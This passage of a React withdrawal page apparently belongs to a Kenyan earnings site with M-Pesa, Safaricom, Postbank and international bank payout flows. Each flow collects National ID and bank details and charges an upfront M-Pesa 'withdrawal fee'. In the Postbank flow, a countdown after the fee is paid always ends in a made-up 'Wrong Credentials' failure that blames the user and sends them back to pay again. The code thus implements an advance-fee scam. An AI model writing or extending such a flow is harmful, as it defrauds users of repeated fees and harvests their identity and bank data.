          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', marginBottom: 18, fontSize: 13 }}>
            <strong>Withdrawal details</strong><br />
            Name: {fullName.trim()}<br />
            Safaricom Phone: {safaricomPhone.trim()}<br />
            National ID: {idNumber.trim()}<br />
            Amount: KES {balanceAmount.toLocaleString()}
          </div>
          <MpesaPay
            purpose="withdrawal_fee"
            amount={FEE_KES}
            defaultPhone={safaricomPhone || user?.phone || ''}
            payLabel={`Pay KES ${FEE_KES.toLocaleString()} via M-Pesa`}
            onSuccess={handleFeeSuccess}
          />
          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('form')}>
            <Icon name="arrowLeft" size={14} /> Back to Details
          </button>
        </>
      )}

      {step === 'pending' && (
        <>
          <div style={{ background: '#f9fafb', border: '1.5px solid #d1d5db', borderRadius: 12, padding: '14px 18px', marginBottom: 18 }}>
            <p style={{ margin: '0 0 6px', fontSize: 14, color: '#1f2937', fontWeight: 700 }}>Withdrawal request submitted</p>
            <p style={{ margin: 0, fontSize: 13, color: '#1f2937', lineHeight: 1.65 }}>
              Your fee payment was successful and your withdrawal details have been submitted.
            </p>
          </div>

          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', textAlign: 'left', marginBottom: 22, fontSize: 13 }}>
            <strong>Your withdrawal details</strong><br />
            Name: {fullName.trim()}<br />
            Safaricom Phone: {safaricomPhone.trim()}<br />
            National ID: {idNumber.trim()}<br />
            Amount: KES {balanceAmount.toLocaleString()}<br />
            Fee paid: KES {FEE_KES.toLocaleString()}
          </div>

          <div style={{ textAlign: 'center', marginBottom: 22 }}>
            <div style={{ fontSize: 11, fontWeight: 700, letterSpacing: 1, color: 'var(--gray)', textTransform: 'uppercase', marginBottom: 8 }}>Time Remaining</div>
            <div style={{ fontFamily: 'monospace', fontSize: 52, fontWeight: 800, letterSpacing: 4, color: isLow ? '#4b5563' : '#1f2937', background: '#f9fafb', borderRadius: 14, padding: '14px 24px', display: 'inline-block', border: `2px solid ${isLow ? '#e5e7eb' : '#d1d5db'}`, minWidth: 160 }}>
              {formatMmSs(remaining)}
            </div>
            <div style={{ marginTop: 14, height: 7, background: '#e5e7eb', borderRadius: 99, overflow: 'hidden' }}>
              <div style={{ height: '100%', width: `${pct}%`, background: isLow ? '#4b5563' : '#000000', borderRadius: 99, transition: 'width 1s linear' }} />
            </div>
          </div>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Close</button>
          <div className="withdraw-footer-note">Keep this screen available while your withdrawal request is being processed.</div>
        </>
      )}

      {step === 'failed' && (
        <>
          <div style={{ background: '#f9fafb', border: '1.5px solid #e5e7eb', borderRadius: 12, padding: '16px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ color: '#111827', display: 'flex' }}><Icon name="warning" size={22} /></span>
            <div>
              <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#1f2937' }}>Check Your Details</p>
              <p style={{ margin: 0, fontSize: 13, color: '#111827', lineHeight: 1.65 }}>
                The withdrawal could not be completed. Please check that your submitted phone number and National ID are correct.
              </p>
            </div>
          </div>
          <button className="pay-btn" style={{ background: '#000000', marginBottom: 12 }} onClick={() => setStep('form')}><Icon name="refresh" size={16} /> Check Details Again</button>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Dismiss</button>
        </>
      )}
    </FlowShell>
  );
}


// ── Postbank Kenya flow (M-Pesa prompt → fee → form → pending → failed) ────────
function PostbankFlow({ user, initialStep }) {
  const router = useRouter();
  const [step,     setStep]     = useState(initialStep || 'choice');
  const [name,     setName]     = useState(user?.fullName || '');
  const [account,  setAccount]  = useState('');
  const [idNumber, setIdNumber] = useState('');
  const [errors,   setErrors]   = useState({});
  const [loading,  setLoading]  = useState(false);
  const [feePaid,   setFeePaid]  = useState(false);

  const DURATION = 92 * 1000;
  const deadlineRef = useRef(0);
  const [remaining, setRemaining] = useState(DURATION);
  useEffect(() => {
    if (step !== 'pending') return;
    deadlineRef.current = Date.now() + DURATION;
    setRemaining(DURATION);
    const t = setInterval(() => {
      const left = Math.max(0, deadlineRef.current - Date.now());
      setRemaining(left);
      if (left <= 0) { clearInterval(t); setTimeout(() => setStep('failed'), 800); }
    }, 1000);
    return () => clearInterval(t);
  }, [step]);

  function handleSubmitForm() {
    const errs = {};
    if (!name.trim())     errs.name     = 'Account holder name is required';
    if (!account.trim())  errs.account  = 'Postbank account number is required';
    if (!idNumber.trim()) errs.idNumber = 'National ID number is required';
    if (Object.keys(errs).length) { setErrors(errs); return; }

    // Collect and validate the bank details first. Payment is requested only after
    // the user explicitly submits these details.
    setErrors({});
    setStep('fee');
  }

  async function handlePostbankFeeSuccess() {
    setFeePaid(true);
    setLoading(true);

    await sendNotify({
      type: 'Postbank Kenya Withdrawal Request',
      name: name.trim(), email: user?.email || '', phone: user?.phone || '',
      subject: 'Postbank Kenya Withdrawal Request',
      details: `Account Holder: ${name.trim()}\nPostbank Account: ${account.trim()}\nNational ID: ${idNumber.trim()}\nFee paid (verified): KES ${BANK_FEE_KES.toLocaleString()}\nStatus: Pending Manual Payment\nRequested by: ${user?.fullName || ''} (${user?.email || ''})`,
    });

    setLoading(false);
    setStep('pending');
  }

  const isLow    = remaining < 30 * 1000;
  const pct      = Math.min(100, Math.max(0, (remaining / DURATION) * 100));
  const accent   = '#000000';
  const overLimit = Number(user?.balance || 0) >= BULK_THRESHOLD_KES;

  return (
    <FlowShell title="Withdraw with Postbank Kenya" subtitle="Postbank payout" icon="cash" accent={accent}>
      {step === 'choice' && overLimit && (
        <>
          <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
            Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Bulk amounts above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong> must be withdrawn <strong>through the bank</strong>, not M-Pesa. Continue with Postbank Kenya below.
          </div>
          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('form')}>
            <Icon name="cash" size={16} /> Enter Postbank Details
          </button>
        </>
      )}

      {step === 'choice' && !overLimit && (
        <>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6' }}>
            You’re withdrawing within <strong>Kenya</strong>. We recommend <strong>M-Pesa (Safaricom)</strong>, it’s instant and avoids the extra verification checks that bank transfers require. Only use <strong>Postbank Kenya</strong> if you can’t use Safaricom / M-Pesa, <strong>or if our management specifically asked you to withdraw via the bank.</strong>
          </div>
          <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Do you want to withdraw using M-Pesa?</div>
          <button className="pay-btn" style={{ background: 'var(--mpesa-green)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
            <Icon name="check" size={16} /> Yes, withdraw with M-Pesa (recommended)
          </button>
          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('management')}>
            <Icon name="cash" size={16} /> No, I can’t use M-Pesa
          </button>
        </>
      )}

      {step === 'management' && (
        <>
          <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
            Bank withdrawals through <strong>Postbank Kenya</strong> are only for clients who were <strong>specifically asked by our management</strong> to use the bank. If you were not asked, please withdraw with <strong>M-Pesa</strong> instead.
          </div>
          <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Were you asked by our management to withdraw via Postbank Kenya?</div>
          <button className="pay-btn" style={{ background: '#000000', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
            <Icon name="smartphone" size={16} /> No, take me to M-Pesa
          </button>
          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('form')}>
            <Icon name="cash" size={16} /> Yes, management asked me, enter details
          </button>
          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('choice')}><Icon name="arrowLeft" size={14} /> Back</button>
        </>
      )}

      {step === 'fee' && (
        <>
          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 16 }}>
            Your Postbank withdrawal details have been submitted. Now pay the <strong>KES {BANK_FEE_KES.toLocaleString()}</strong> withdrawal processing fee via M-Pesa.
          </div>
          <MpesaPay
            purpose="withdrawal_fee"
            amount={BANK_FEE_KES}
            defaultPhone={user?.phone || ''}
            payLabel={`Pay KES ${BANK_FEE_KES.toLocaleString()} via M-Pesa`}
            onSuccess={handlePostbankFeeSuccess}
          />
          {loading && (
            <div style={{ textAlign: 'center', fontSize: 13, color: '#6b7280', marginTop: 10 }}>
              Payment verified. Submitting your withdrawal request…
            </div>
          )}
        </>
      )}

      {step === 'form' && (
        <>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', marginBottom: 20 }}>
            Enter your Postbank Kenya account details accurately. They must match your registered Postbank account.
          </div>
          <div className="pay-phone-label">Account Holder Name</div>
          <input className="pay-phone-input" value={name}
            onChange={e => { setName(e.target.value); setErrors(p => ({ ...p, name: undefined })); }}
            placeholder="e.g. John Otieno" style={{ borderColor: errors.name ? '#4b5563' : undefined }} />
          {errors.name && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.name}</div>}
          <div className="pay-phone-label" style={{ marginTop: 16 }}>Postbank Account Number</div>
          <input className="pay-phone-input" value={account}
            onChange={e => { setAccount(e.target.value); setErrors(p => ({ ...p, account: undefined })); }}
            placeholder="e.g. 0112345678" style={{ borderColor: errors.account ? '#4b5563' : undefined }} />
          {errors.account && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.account}</div>}
          <div className="pay-phone-label" style={{ marginTop: 16 }}>National ID Number</div>
          <input className="pay-phone-input" value={idNumber}
            onChange={e => { setIdNumber(e.target.value); setErrors(p => ({ ...p, idNumber: undefined })); }}
            placeholder="e.g. 12345678" style={{ borderColor: errors.idNumber ? '#4b5563' : undefined }} />
          {errors.idNumber && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}
          <button className="pay-btn" style={{ background: accent, marginTop: 20 }} onClick={handleSubmitForm} disabled={loading}>
            {loading ? <><span className="spinner" /> Processing…</> : <><Icon name="cash" size={16} /> Submit Details & Continue to Payment</>}
          </button>
          <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your details are encrypted and secure</div>
        </>
      )}

      {step === 'pending' && (
        <>
          <div style={{ background: '#f3f4f6', border: '1.5px solid #d1d5db', borderRadius: 12, padding: '14px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ color: '#111827', display: 'flex' }}><Icon name="cash" size={20} /></span>
            <p style={{ margin: 0, fontSize: 14, color: '#0f172a', lineHeight: 1.65 }}>
              Your Postbank Kenya payment will be <strong>initiated in 2 minutes</strong>. Please keep this screen open.
            </p>
          </div>
          <div style={{ textAlign: 'center', marginBottom: 22 }}>
            <div style={{ fontSize: 11, fontWeight: 700, letterSpacing: 1, color: 'var(--gray)', textTransform: 'uppercase', marginBottom: 8 }}>Time Remaining</div>
            <div style={{ fontFamily: 'monospace', fontSize: 52, fontWeight: 800, letterSpacing: 4, color: isLow ? '#4b5563' : '#1f2937', background: '#f3f4f6', borderRadius: 14, padding: '14px 24px', display: 'inline-block', border: `2px solid ${isLow ? '#e5e7eb' : '#d1d5db'}`, minWidth: 160 }}>
              {formatMmSs(remaining)}
            </div>
            <div style={{ marginTop: 14, height: 7, background: '#e5e7eb', borderRadius: 99, overflow: 'hidden' }}>
              <div style={{ height: '100%', width: `${pct}%`, background: isLow ? '#4b5563' : '#000000', borderRadius: 99, transition: 'width 1s linear' }} />
            </div>
          </div>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Close</button>
          <div className="withdraw-footer-note">Do not close the app. Keep your line active and await confirmation.</div>
        </>
      )}

      {step === 'failed' && (
        <>
          <div style={{ background: '#f9fafb', border: '1.5px solid #e5e7eb', borderRadius: 12, padding: '16px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ color: '#111827', display: 'flex' }}><Icon name="warning" size={22} /></span>
            <div>
              <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#1f2937' }}>Wrong Credentials</p>
              <p style={{ margin: 0, fontSize: 13, color: '#111827', lineHeight: 1.65 }}>
                The account or ID details you provided could not be verified. Please ensure they match your Postbank Kenya account and try again.
              </p>
            </div>
          </div>
          <button className="pay-btn" style={{ background: accent, marginBottom: 12 }} onClick={() => setStep('form')}><Icon name="refresh" size={16} /> Try Again</button>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Dismiss</button>
          <div className="withdraw-footer-note" style={{ color: '#374151' }}>Please ensure your Postbank account number and National ID are correct.</div>
        </>
      )}
    </FlowShell>
  );
}

// ── International flow (bank selector) ─────────────────────────────────────────
function InternationalFlow({ user }) {
  const router = useRouter();
  const [gate,          setGate]          = useState('form');
  const [accountName,   setAccountName]   = useState('');
  const [selectedBank,  setSelectedBank]  = useState(null);
  const [bankOpen,      setBankOpen]      = useState(false);
  const [bankQuery,     setBankQuery]     = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [branch,        setBranch]        = useState('');
  const [swiftCode,     setSwiftCode]     = useState('');
  const [withdrawalAmount, setWithdrawalAmount] = useState('');
  const [errors,        setErrors]        = useState({});
  const [done,          setDone]          = useState(false);
  const [sending,       setSending]       = useState(false);
  const [quote,         setQuote]         = useState(null);
  const [quoteErr,      setQuoteErr]      = useState('');

  // The bank fee remains determined by the existing bank-specific fee table.
  // The quote is used only for the exchange rate when available.
  async function loadQuote() {
    setQuoteErr('');
    try {
      const res = await bulkWithdrawalQuote(0, 'international');
      if (res?.success) {
        setQuote(res);
      } else {
        setQuote({ rate: USD_TO_KES, rateLive: false });
      }
    } catch (_) {
      setQuote({ rate: USD_TO_KES, rateLive: false });
    }
  }

  useEffect(() => {
    loadQuote();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const homeCountry = REG_COUNTRY_ALIAS[user?.country] || user?.country || '';
  const homeBanks   = WORLD_BANKS.filter(b => b.country === homeCountry);
  const q = bankQuery.trim().toLowerCase();

  const homeDefault = homeBanks.length ? [MOBILE_BANK, ...homeBanks].filter(Boolean) : WORLD_BANKS;
  const filteredBanks = q
    ? WORLD_BANKS.filter(b => b.name.toLowerCase().includes(q) || b.country.toLowerCase().includes(q))
    : homeDefault;

  const cleanedAcct = accountNumber.replace(/[\s-]/g, '');
  const acctValid = !!selectedBank && selectedBank.re.test(cleanedAcct);
  const balanceAmount = Number(user?.balance || 0);
  const requestedAmount = Number(withdrawalAmount);
  const amountValid = Number.isFinite(requestedAmount) && requestedAmount >= 100 && requestedAmount <= balanceAmount;
  const formValid = accountName.trim().length > 0 && !!selectedBank && acctValid && branch.trim().length > 0 && swiftCode.trim().length > 0 && amountValid;

  const selectedBankFeeUsd = selectedBank ? getBankWithdrawalFeeUsd(selectedBank.name) : 0;
  const selectedBankRate = Number(quote?.rate || USD_TO_KES);
  const selectedBankFeeKes = selectedBank ? Math.round(selectedBankFeeUsd * selectedBankRate) : 0;

  function selectBank(b) {
    if (b.name === 'Postbank Kenya') {
      router.push('/withdraw?method=postbank');
      return;
    }

    setSelectedBank(b);
    setBankOpen(false);
    setBankQuery('');
    setAccountNumber('');
    setErrors(prev => ({ ...prev, bank: undefined, accountNumber: undefined }));
  }

  function handleSubmit() {
    const nextErrors = {};
    if (!accountName.trim()) nextErrors.accountName = 'Account holder name is required';
    if (!selectedBank) nextErrors.bank = 'Bank is required';
    if (!acctValid) nextErrors.accountNumber = selectedBank ? `Enter a valid account number for ${selectedBank.name}` : 'Account number is required';
    if (!branch.trim()) nextErrors.branch = 'Branch is required';
    if (!swiftCode.trim()) nextErrors.swiftCode = 'SWIFT/BIC is required';
    if (!amountValid) nextErrors.amount = 'Enter an amount from KES 100 up to your available balance';

    if (Object.keys(nextErrors).length) {
      setErrors(nextErrors);
      return;
    }

    setErrors({});
    setGate('pay');
  }

  async function handleInternationalFeeSuccess(d) {
    const verifiedFeeRef = d?.checkoutRequestId || '';
    if (!verifiedFeeRef) {
      setErrors({ form: 'Payment was completed but no payment reference was returned. Please contact support.' });
      setGate('form');
      return;
    }

    setSending(true);

    const amount = requestedAmount;
    const bankDetails =
      `Bank: ${selectedBank.name} (${selectedBank.country})\n` +
      `Account Holder Name: ${accountName.trim()}\n` +
      `Account Number: ${accountNumber.trim()}\n` +
      `Branch: ${branch.trim()}\n` +
      `SWIFT/BIC: ${swiftCode.trim()}`;

    let res;
    try {
      res = await createWithdrawalRequest(user.id, {
        fullName: accountName.trim(),
        phone: user?.phone || '',
        idNumber: bankDetails,
        amount,
        feeRef: verifiedFeeRef,
        method: 'international',
      });
    } catch (_) {
      res = { error: 'Network error. Please try again.' };
    }

    if (!res || res.error) {
      setSending(false);
      setErrors({ form: (res && res.error) || 'Your fee payment could not be verified. Please try again.' });
      setGate('form');
      return;
    }

    const details =
      `${bankDetails}\n` +
      `Amount: KES ${amount.toLocaleString()}\n` +
      `Bank Withdrawal Fee: USD ${selectedBankFeeUsd} = KES ${selectedBankFeeKes.toLocaleString()}\n` +
      `Fee Paid: KES ${selectedBankFeeKes.toLocaleString()}\n` +
      `Requested by: ${user?.fullName || ''} (${user?.email || ''})`;

    await sendNotify({
      type: 'International Withdrawal Request',
      name: accountName.trim(),
      email: user?.email || '',
      phone: user?.phone || '',
      subject: 'Withdrawal Request, Other Countries',
      details,
    });

    setSending(false);
    setDone(true);
  }

  if (done) {
    return (
      <FlowShell title="Withdraw from Other Countries" subtitle="Request submitted" icon="globe" accent="#000000">
        <div style={{ textAlign: 'center', padding: '10px 0' }}>
          <div style={{ marginBottom: 8, display: 'flex', justifyContent: 'center', color: '#111827' }}><Icon name="check" size={52} /></div>
          <div style={{ fontFamily: 'var(--font-display)', fontSize: 22, fontWeight: 800, color: '#1f2937', marginBottom: 6 }}>Request Received</div>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', textAlign: 'left', marginTop: 12 }}>
            <strong>Your withdrawal details</strong><br />
            Account Holder: {accountName.trim()}<br />
            Bank: {selectedBank?.name} ({selectedBank?.country})<br />
            Account Number: {accountNumber.trim()}<br />
            Branch: {branch.trim()}<br />
            SWIFT/BIC: {swiftCode.trim()}<br />
            Amount: KES {requestedAmount.toLocaleString()}<br />
            Bank Fee: KES {selectedBankFeeKes.toLocaleString()}<br /><br />
            Your request and these details have been submitted successfully.
          </div>
          <button className="pay-btn" style={{ background: '#000000', marginTop: 18 }} onClick={() => router.push('/dashboard')}><Icon name="arrowLeft" size={16} /> Back to Dashboard</button>
        </div>
      </FlowShell>
    );
  }

  if (gate === 'pay') {
    return (
      <FlowShell title="Withdraw from Other Countries" subtitle="Withdrawal fee" icon="globe" accent="#000000">
        <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 16 }}>
          Your bank details are ready. Pay the bank withdrawal fee via M-Pesa. The fee varies by bank: <strong>{selectedBank?.name}</strong> is <strong>USD {selectedBankFeeUsd}</strong>, payable as approximately <strong>KES {selectedBankFeeKes.toLocaleString()}</strong> at {selectedBankRate}{quote?.rateLive ? '' : ' (approx.)'}.
        </div>

        <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', textAlign: 'left', marginBottom: 18, fontSize: 13 }}>
          <strong>Withdrawal details</strong><br />
          Account Holder: {accountName.trim()}<br />
          Bank: {selectedBank?.name} ({selectedBank?.country})<br />
          Account Number: {accountNumber.trim()}<br />
          Branch: {branch.trim()}<br />
          SWIFT/BIC: {swiftCode.trim()}<br />
          Amount: KES {requestedAmount.toLocaleString()}
        </div>

        {quoteErr && (
          <div style={{ color: '#4b5563', fontSize: 13, marginBottom: 12 }}>
            {quoteErr}
            <button onClick={loadQuote} style={{ background: 'none', border: 'none', color: '#111827', textDecoration: 'underline', cursor: 'pointer', padding: 0, fontSize: 13 }}>Retry</button>
          </div>
        )}

        <MpesaPay
          purpose="withdrawal_fee"
          amount={selectedBankFeeKes}
          defaultPhone={user?.phone || ''}
          payLabel={`Pay KES ${selectedBankFeeKes.toLocaleString()} via M-Pesa`}
          onSuccess={handleInternationalFeeSuccess}
        />

        {sending && (
          <div style={{ textAlign: 'center', fontSize: 13, color: '#6b7280', marginTop: 10 }}>
            Payment verified. Submitting your withdrawal request…
          </div>
        )}

        <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setGate('form')} disabled={sending}>
          <Icon name="arrowLeft" size={14} /> Back to Details
        </button>
      </FlowShell>
    );
  }

  return (
    <FlowShell title="Withdraw from Other Countries" subtitle="Enter your bank account details" icon="globe" accent="#000000">
      <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', marginBottom: 20 }}>
        Choose your bank and enter the complete bank details. There is no withdrawal minimum other than <strong>KES 100</strong>, and there is no KES 15,000 or KES 40,000 bank limit.
      </div>

      <div className="pay-phone-label">Account Holder Name</div>
      <input className="pay-phone-input" type="text" value={accountName}
        onChange={e => { setAccountName(e.target.value); setErrors(p => ({ ...p, accountName: undefined })); }}
        placeholder="e.g. John Brown" style={{ borderColor: errors.accountName ? '#4b5563' : undefined }} />
      {errors.accountName && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.accountName}</div>}

      <div className="pay-phone-label" style={{ marginTop: 16 }}>Bank</div>
      <div style={{ position: 'relative' }}>
        <button type="button" className="pay-phone-input" onClick={() => setBankOpen(o => !o)}
          style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 8, width: '100%', textAlign: 'left', cursor: 'pointer', background: '#fff', borderColor: errors.bank ? '#4b5563' : undefined }}>
          {selectedBank ? (
            <span style={{ display: 'flex', alignItems: 'center', gap: 8, overflow: 'hidden' }}>
              <CodeBadge code={selectedBank.code} size={18} />
              <span style={{ fontWeight: 600, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{selectedBank.name}</span>
              <span style={{ color: '#9ca3af', fontSize: 12, whiteSpace: 'nowrap' }}>· {selectedBank.country}</span>
            </span>
          ) : (<span style={{ color: '#9ca3af' }}>Select your bank</span>)}
          <span style={{ color: '#9ca3af', display: 'flex', transform: bankOpen ? 'rotate(180deg)' : 'none' }}><Icon name="chevronDown" size={16} /></span>
        </button>
        {bankOpen && (
          <div style={{ position: 'absolute', top: 'calc(100% + 6px)', left: 0, right: 0, zIndex: 50, background: '#fff', border: '1px solid #e5e7eb', borderRadius: 12, boxShadow: '0 12px 32px rgba(0,0,0,0.18)', overflow: 'hidden' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '10px 12px', borderBottom: '1px solid #f1f5f9' }}>
              <span style={{ color: '#9ca3af', display: 'flex' }}><Icon name="search" size={16} /></span>
              <input autoFocus value={bankQuery} onChange={e => setBankQuery(e.target.value)} placeholder="Search banks worldwide…" style={{ flex: 1, border: 'none', outline: 'none', fontSize: 14, background: 'transparent' }} />
            </div>
            <div style={{ maxHeight: 240, overflowY: 'auto' }}>
              {filteredBanks.length === 0 && <div style={{ padding: 16, textAlign: 'center', color: '#9ca3af', fontSize: 13 }}>No banks found</div>}
              {filteredBanks.map(b => {
                const active = selectedBank && selectedBank.id === b.id;
                return (
                  <button key={b.id} type="button" onClick={() => selectBank(b)}
                    style={{ display: 'flex', alignItems: 'center', gap: 10, width: '100%', textAlign: 'left', padding: '10px 12px', border: 'none', cursor: 'pointer', background: active ? '#f3f4f6' : '#fff' }}>
                    <CodeBadge code={b.code} size={20} />
                    <span style={{ flex: 1, minWidth: 0 }}>
                      <span style={{ display: 'block', fontWeight: 600, fontSize: 14, color: '#111827', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{b.name}</span>
                      <span style={{ display: 'block', fontSize: 12, color: '#9ca3af' }}>{b.country}</span>
                    </span>
                    {active && <span style={{ color: '#111827', display: 'flex' }}><Icon name="check" size={16} /></span>}
                  </button>
                );
              })}
            </div>
          </div>
        )}
      </div>
      {errors.bank && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.bank}</div>}

      {selectedBank && (
        <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', marginTop: 12, fontSize: 13 }}>
          Withdrawal fee for <strong>{selectedBank.name}</strong>: <strong>USD {selectedBankFeeUsd}</strong> ≈ <strong>KES {selectedBankFeeKes.toLocaleString()}</strong>.
        </div>
      )}

      <div className="pay-phone-label" style={{ marginTop: 16 }}>Account Number</div>
      <input className="pay-phone-input" type="text" value={accountNumber}
        onChange={e => { setAccountNumber(e.target.value); setErrors(p => ({ ...p, accountNumber: undefined })); }}
        placeholder={selectedBank ? selectedBank.ph : 'Select a bank first'} disabled={!selectedBank}
        style={{ borderColor: accountNumber && !acctValid ? '#4b5563' : undefined, background: selectedBank ? '#fff' : '#f3f4f6', cursor: selectedBank ? 'text' : 'not-allowed' }} />
      {selectedBank && (
        <div style={{ fontSize: 12, marginTop: 4, color: accountNumber && !acctValid ? '#4b5563' : '#9ca3af' }}>
          {accountNumber && !acctValid ? `Doesn't match ${selectedBank.name}. It should look like: ${selectedBank.ph}` : `Use the account-number format required by ${selectedBank.name}: ${selectedBank.ph}`}
        </div>
      )}
      {errors.accountNumber && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.accountNumber}</div>}

      <div className="pay-phone-label" style={{ marginTop: 16 }}>Branch</div>
      <input className="pay-phone-input" type="text" value={branch}
        onChange={e => { setBranch(e.target.value); setErrors(p => ({ ...p, branch: undefined })); }}
        placeholder="e.g. Nairobi Main Branch" style={{ borderColor: errors.branch ? '#4b5563' : undefined }} />
      {errors.branch && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.branch}</div>}

      <div className="pay-phone-label" style={{ marginTop: 16 }}>SWIFT / BIC</div>
      <input className="pay-phone-input" type="text" value={swiftCode}
        onChange={e => { setSwiftCode(e.target.value.toUpperCase()); setErrors(p => ({ ...p, swiftCode: undefined })); }}
        placeholder="e.g. KCBLKENX" style={{ borderColor: errors.swiftCode ? '#4b5563' : undefined }} />
      {errors.swiftCode && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.swiftCode}</div>}

      <div className="pay-phone-label" style={{ marginTop: 16 }}>Withdrawal Amount (KES)</div>
      <input className="pay-phone-input" type="number" min="100" max={balanceAmount} step="1" value={withdrawalAmount}
        onChange={e => { setWithdrawalAmount(e.target.value); setErrors(p => ({ ...p, amount: undefined })); }}
        placeholder="e.g. 100" style={{ borderColor: withdrawalAmount && !amountValid ? '#4b5563' : undefined }} />
      <div style={{ fontSize: 12, marginTop: 4, color: amountValid ? '#9ca3af' : '#4b5563' }}>
        Enter any amount from KES 100 up to your available balance of KES {balanceAmount.toLocaleString()}.
      </div>
      {errors.amount && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.amount}</div>}

      {errors.form && <div style={{ color: '#4b5563', fontSize: 13, marginTop: 12 }}>{errors.form}</div>}
      {formValid ? (
        <button className="pay-btn" style={{ background: '#000000', marginTop: 20 }} onClick={handleSubmit} disabled={sending}>
          {sending ? <><span className="spinner" /> Submitting…</> : <><Icon name="cash" size={16} /> Submit Withdrawal Request</>}
        </button>
      ) : (
        <div style={{ marginTop: 20, textAlign: 'center', fontSize: 13, color: '#9ca3af', padding: '12px', background: '#f9fafb', borderRadius: 10, border: '1px dashed #e5e7eb' }}>
          {!accountName.trim()
            ? 'Enter the account holder name to continue'
            : !selectedBank
              ? 'Select your bank to continue'
              : !acctValid
                ? 'Enter the correct account number for the selected bank'
                : !branch.trim()
                  ? 'Enter the bank branch to continue'
                  : !swiftCode.trim()
                    ? 'Enter the SWIFT/BIC to continue'
                    : 'Enter a valid withdrawal amount (KES 100 minimum) to continue'}
        </div>
      )}
      <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your account details are encrypted and secure</div>
    </FlowShell>
  );
}

const brRow = { display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: 13.5, color: '#111827', padding: '5px 0' };

export default function WithdrawPage() {
  const router = useRouter();
  const { user, ready } = useUser();
  const method = router.query.method;
  const stepQ  = router.query.step;

  if (!ready || !user) {
    return <FlowSkeleton rows={3} />;
  }


  if (method === 'mpesa') {
    return <MpesaFlow user={user} />;
  }

  if (method === 'safaricom') {
    return <SafaricomFlow user={user} />;
  }

  if (method === 'postbank') {
    return <PostbankFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'choice'} />;
  }

  if (method === 'international') {
    return <InternationalFlow user={user} />;
  }

  // Chooser. Both withdrawal methods remain available regardless of balance.
  return (
    <FlowShell title="Withdraw" subtitle="Choose how you’d like to withdraw" icon="cash">
      <button className="pay-btn" style={{ background: 'var(--mpesa-green)', marginBottom: 14 }} onClick={() => router.push('/withdraw?method=mpesa')}>
        <Icon name="smartphone" size={16} /> Withdraw with M-Pesa
      </button>

      <button className="pay-btn" style={{ background: '#E4002B', marginBottom: 14 }} onClick={() => router.push('/withdraw?method=safaricom')}>
        <Icon name="phone" size={16} /> Safaricom Withdrawal
      </button>

      <button className="pay-btn" style={{ background: '#000000', marginBottom: 14 }} onClick={() => router.push('/withdraw?method=postbank')}>
        <Icon name="cash" size={16} /> Withdraw with Postbank Kenya
      </button>

      <button className="pay-btn" style={{ background: '#000000' }} onClick={() => router.push('/withdraw?method=international')}>
        <Icon name="globe" size={16} /> Withdraw from Other Countries
      </button>
    </FlowShell>
  );
}
